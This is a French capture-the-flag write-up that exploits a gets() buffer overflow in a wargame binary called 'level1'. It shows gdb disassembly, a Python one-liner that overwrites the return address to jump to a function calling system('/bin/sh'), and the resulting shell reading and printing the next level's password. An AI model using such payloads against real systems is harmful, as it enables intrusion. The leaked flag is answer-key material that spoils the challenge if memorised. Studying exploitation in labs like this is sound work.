# Level 1

Quand je lance le programme `level1` je peux voir qu'il lis sur l'entrée standard, il doit donc être possible de faire un buffer overflow.

Je peux tester si le programme `segfault` en écrivant une longue suite de charactère.

```sh
~ ./level1
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

Je sais donc que je peux injecter du `shellcode` au programme pour éxécuter `/bin/sh`.

Pour savoir combien de charactère je vais devoir injecter, je lance `gdb`. Le buffer est de `0x50` soit `80` en décimal comme on peut le voir à l'instruction `<+6>` du main.

```shell
~ gdb level1
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
```

En éxécutant la commande `info function` dans `gdb`, on remarque qu'il y a un appel à `system` et qu'il existe une fonction `run` et que c'est elle qui appel la fonction `system`.

```shell
(gdb) info function
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
[...]
0x08048444  run
0x08048480  main
[...]
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
End of assembler dump.
(gdb) x/s 0x8048584
0x8048584:	 "/bin/sh"
```

L'argument que prend `system` est `/bin/sh`, notre objectif est donc d'appeler `run` à la place d'un `shellcode` en utilisant son adresse `0x08048444`. On fait un padding de `76` A car lorsque nous mettons `80` nous réecrivons `EIP`.

```shell
~ python -c 'print "A"*76+"\x44\x84\x04\x08"' > /tmp/run
~ cat /tmp/run - | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```